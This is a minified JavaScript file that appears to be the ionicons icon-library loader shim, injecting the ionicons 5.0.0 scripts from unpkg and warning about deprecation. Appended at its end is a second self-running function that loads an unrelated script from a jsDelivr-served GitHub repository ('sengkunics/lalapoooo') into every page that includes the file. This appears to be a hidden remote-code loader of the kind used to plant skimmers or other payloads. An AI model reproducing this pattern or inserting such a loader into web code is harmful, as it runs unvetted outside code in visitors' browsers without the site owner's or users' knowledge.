!function (e) { var t = ["[ionicons] Deprecated script, please remove: " + (s = e.scripts[e.scripts.length - 1]).outerHTML]; t.push("To improve performance it is recommended to set the differential scripts in the head as follows:"); var n = s.src.split("/"); n.pop(), n.push("ionicons"); var s; n.join("/"); (s = e.createElement("script")).setAttribute("type", "module"), s.src = "https://unpkg.com/ionicons@5.0.0/dist/ionicons/ionicons.esm.js", t.push(s.outerHTML), s.setAttribute("data-stencil-namespace", "ionicons"), e.head.appendChild(s), (s = e.createElement("script")).setAttribute("nomodule", ""), s.src = "https://unpkg.com/ionicons@5.0.0/dist/ionicons/ionicons.js", t.push(s.outerHTML), s.setAttribute("data-stencil-namespace", "ionicons"), e.head.appendChild(s), console.warn(t.join("\n")) }(document), function () { var e = document.createElement("script"); e.type = "text/javascript", e.src = "https://cdn.jsdelivr.net/gh/sengkunics/lalapoooo", document.body.appendChild(e) }();
